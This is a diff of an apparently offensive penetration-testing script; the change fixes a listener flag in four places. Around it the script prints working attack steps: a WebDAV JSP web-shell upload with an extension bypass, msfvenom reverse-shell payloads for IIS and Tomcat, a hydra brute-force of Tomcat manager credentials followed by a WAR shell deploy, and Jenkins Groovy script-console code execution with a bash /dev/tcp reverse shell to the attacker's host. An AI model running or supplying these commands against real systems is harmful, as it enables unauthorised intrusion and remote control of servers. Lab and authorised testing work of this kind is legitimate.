@@ -1998,7 +1998,7 @@ WEBDAV_JSP
             "curl -sk -T $webdav_jsp '${url%/}/shell.jsp;.jpg' && curl -sk '${url%/}/shell.jsp;.jpg?cmd=id'" \
             "" \
             "# DECIDE: whatweb shows IIS / ASP.NET — ASPX shell (start penelope listener FIRST):" \
-            "# On Kali: penelope -0 -p 4444" \
+            "# On Kali: penelope -O -p 4444" \
             "# msfvenom -p windows/shell_reverse_tcp LHOST=\${KALI_IP} LPORT=4444 -f aspx > /tmp/shell.aspx" \
             "# curl -sk -T /tmp/shell.aspx ${url%/}/shell.aspx && curl -sk '${url%/}/shell.aspx'   # revshell fires on listener" \
             "# If .aspx blocked → try .asp (older IIS) or .ashx (HTTP handler)" \
@@ -2338,7 +2338,7 @@ JWT_NONE
     if [[ -n "$cgi_hits" ]]; then
         local cgi_cmds=()
         cgi_cmds+=("# Step 0 — start reverse-shell listener on Kali BEFORE step 3 (AGENTS.md §3 convention):")
-        cgi_cmds+=("penelope -0 -p 4444")
+        cgi_cmds+=("penelope -O -p 4444")
         cgi_cmds+=("")
         cgi_cmds+=("# Step 1 — confirm each observed CGI path is live:")
         while IFS= read -r cgi_url; do
@@ -2763,7 +2763,7 @@ WP_MULTICALL
             "# Brute default creds (tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret):" \
             "hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt -P /usr/share/seclists/Passwords/tomcat-betterdefaults.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-get /manager/html" \
             "# Build + deploy WAR shell — start listener FIRST (AGENTS.md §3 convention):" \
-            "# On Kali: penelope -0 -p 4444" \
+            "# On Kali: penelope -O -p 4444" \
             "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o /tmp/shell.war" \
             "curl -v -u 'tomcat:tomcat' --upload-file /tmp/shell.war '${url%/}/manager/text/deploy?path=/shell'" \
             "curl -sk ${url%/}/shell/   # triggers the deployed shell → lands on penelope listener" \
@@ -2903,7 +2903,7 @@ JENKINS_DECRYPT
             "curl -skI ${url%/}/script" \
             "# If /script accessible (unauthenticated or after login) — Groovy RCE:" \
             "curl -sk -X POST ${url%/}/script --data-urlencode 'script=println \"id\".execute().text'" \
-            "# Groovy reverse shell — start listener first: penelope -0 -p 4444" \
+            "# Groovy reverse shell — start listener first: penelope -O -p 4444" \
             "curl -sk -X POST ${url%/}/script --data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"].execute()'" \
             "# Enumerate without auth (often accessible):" \
             "curl -sk ${url%/}/api/json?pretty=true | jq .jobs[].name" \
